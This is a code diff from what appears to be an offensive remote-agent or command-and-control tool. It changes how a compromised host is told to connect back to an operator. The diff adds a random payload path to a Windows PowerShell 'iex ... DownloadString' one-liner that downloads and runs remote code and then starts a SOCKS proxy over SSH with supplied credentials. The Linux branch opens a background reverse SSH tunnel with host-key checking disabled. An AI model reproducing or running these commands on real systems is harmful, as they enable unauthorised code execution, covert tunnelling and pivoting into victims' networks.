@@ -680,6 +680,7 @@ class Main:
                         self.print('Telling remote agent to connect back...')
 
                         if proxy_target_agent[-1].startswith('Windows'):
+                            secret_string = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=25))
                             class S(BaseHTTPRequestHandler):
                                 def _set_headers(self):
                                     self.send_response(200)
@@ -714,7 +715,7 @@ class Main:
                             # Continue to send the connect_back_cmd
                             # Kill HTTP server
 
-                            connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/asd")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, proxy_ip, proxy_ssh_username, proxy_ssh_password)
+                            connect_back_cmd = 'iex ((New-Object System.Net.WebClient).DownloadString("http://{}:{}/{}")); Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_port, secret_string, proxy_ip, proxy_ssh_username, proxy_ssh_password)
                         else:
                             shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
                             connect_back_cmd = 'echo {} | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8001 {}@{} >/dev/null 2>&1 &'.format(proxy_ssh_password, proxy_ssh_username, proxy_ip)
